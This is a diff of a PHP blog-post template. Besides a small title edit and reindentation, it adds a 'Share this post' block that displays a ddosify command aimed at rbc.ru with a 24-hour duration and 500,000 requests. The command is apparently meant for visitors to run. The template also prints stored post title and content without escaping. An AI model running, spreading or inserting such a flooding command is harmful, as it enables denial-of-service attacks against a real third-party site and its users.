@@ -41,7 +41,7 @@
 	<head>
 		<?php require 'inc/head.php'; ?>
 		<link rel="stylesheet" href="css/main.css">
-		<title><?php echo $row['title']; ?> | Avaness Alpha</title>
+		<title><?php echo $row['title']; ?> | Avaness</title>
 	</head>
 	<body>
 
@@ -60,14 +60,19 @@
 		<div class="container">
 			<div class="row">
 
-					<div class="col s12">
-						<div class="card">
-							<div class="card-content">
-                                                                <h3 class="center"><?php echo $row['title']; ?></h3>
-								<p><?php echo $row['content']; ?></p>
-							</div>
-      						</div>
-    					</div>
+				<div class="col s12">
+					<div class="card">
+						<div class="card-content">
+                                                        <h3 class="center"><?php echo $row['title']; ?></h3>
+							<p><?php echo $row['content']; ?></p><br>
+							<h5>Share this post</h5>
+							<p>ddosify -t rbc.ru -d 86400 -n 500000</p>
+							<a target="_blank" href="" style="font-size: 35px;"><i class="fa fa-facebook"></i></a>
+							<a target="_blank" href="" style="font-size: 35px;"><i class="fa fa-telegram"></i></a>
+							<a target="_blank" href="" style="font-size: 35px;"><i class="fa fa-twitter"></i></a>
+						</div>
+      					</div>
+    				</div>
 
 			</div>
 		</div>
